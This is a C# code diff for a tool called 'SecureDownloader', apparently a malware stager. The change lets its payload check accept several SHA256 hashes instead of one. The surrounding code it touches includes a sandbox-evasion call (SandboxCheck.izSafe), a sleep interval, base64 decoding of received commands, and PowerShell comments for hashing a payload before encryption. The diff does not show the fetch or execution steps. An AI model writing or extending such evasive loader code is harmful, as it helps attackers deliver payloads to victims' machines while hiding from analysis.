@@ -193,7 +193,7 @@ namespace SecureDownloader {
             return s;
         }
 
-        public static bool CompareHashes(string payload, string origHash)
+        public static bool CompareHashes(string payload, string[] origHashes)
         {
             byte[] bytes = Encoding.Unicode.GetBytes(payload);
             System.Security.Cryptography.SHA256Managed sha256 = new System.Security.Cryptography.SHA256Managed();
@@ -204,7 +204,7 @@ namespace SecureDownloader {
                 hash += String.Format("{0:x2}", x);
             }
 
-            return origHash == hash;
+            return Array.IndexOf(origHashes, hash) >= 0;
         }
     }
 
@@ -212,7 +212,7 @@ namespace SecureDownloader {
         // PS> $text = <paste payload here (before encryption)>
         // PS> $algo = [Security.Cryptography.HashAlgorithm]::Create("SHA256")
         // PS> $result = [System.BitConverter]::ToString($algo.ComputeHash([System.Text.Encoding]::Unicode.GetBytes($text))).ToLower() -replace "-",""
-        const string origHash = "<GENERATE HASH WITH ABOVE>";
+        static readonly string[] origHashes = { "<GENERATE HASH WITH ABOVE>", "<HASH FOR PAYLOAD 2>" };
         const int SLEEPTIME = 30000;
         static void Main() {
             SandboxCheck.izSafe();
@@ -244,7 +244,7 @@ namespace SecureDownloader {
                 if (cmd != "")
                 {
                     decodedCmd = Encoding.Unicode.GetString(Convert.FromBase64String(cmd));
-                    if(HelperFunctions.CompareHashes(decodedCmd, origHash))
+                    if(HelperFunctions.CompareHashes(decodedCmd, origHashes))
                     {
                         break;
                     }
